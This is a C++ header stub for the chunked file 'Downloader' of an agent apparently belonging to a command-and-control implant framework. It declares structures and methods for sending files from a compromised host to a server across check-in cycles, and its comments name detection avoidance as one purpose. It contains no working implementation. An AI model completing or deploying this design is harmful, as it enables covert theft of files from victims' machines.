// __NAME__ Agent — Downloader (Stub)
//
// Manages chunked file downloads (agent → server). Large files are split
// into chunks and sent across multiple check-in cycles to avoid detection
// and memory pressure.
//
// Flow:
//   1. Commander calls Start() with path → allocates DownloadState, returns ID
//   2. Agent loop calls Poll() once per tick → reads next chunk, packs response
//   3. Server ACKs each chunk → agent sends next
//   4. When file is fully sent, Finish() cleans up

#pragma once

#ifdef _WIN32
#include <winsock2.h>
#endif
#include <windows.h>
#include <stdint.h>

// ── Download states ────────────────────────────────────────────────────────────

#define DL_STATE_IDLE       0
#define DL_STATE_SENDING    1
#define DL_STATE_FINISHED   2
#define DL_STATE_ERROR      3

// ── Download entry ─────────────────────────────────────────────────────────────

typedef struct {
    ULONG  downloadId;
    ULONG  state;
    HANDLE hFile;
    char*  filePath;
    ULONG  chunkSize;
    ULONG  totalSize;
    ULONG  bytesSent;
} DownloadState;

// ── Downloader ─────────────────────────────────────────────────────────────────

class Downloader
{
private:
    DownloadState*  downloads;
    int             downloadCount;
    int             downloadCapacity;
    ULONG           nextId;

    CRITICAL_SECTION lock;

public:
    Downloader();
    ~Downloader();

    // Start a new chunked download. Returns download ID, or 0 on failure.
    ULONG Start(const char* filePath, ULONG chunkSize);

    // Read the next chunk for a download. Returns chunk data and size.
    // Returns nullptr when finished or on error.
    BYTE* ReadChunk(ULONG downloadId, ULONG* outSize);

    // Mark a download as finished and release resources.
    BOOL Finish(ULONG downloadId);

    // Cancel and clean up a download.
    BOOL Cancel(ULONG downloadId);

    // Find a download by ID. Returns nullptr if not found.
    DownloadState* Find(ULONG downloadId);

    // Get count of active downloads.
    int ActiveCount();
};
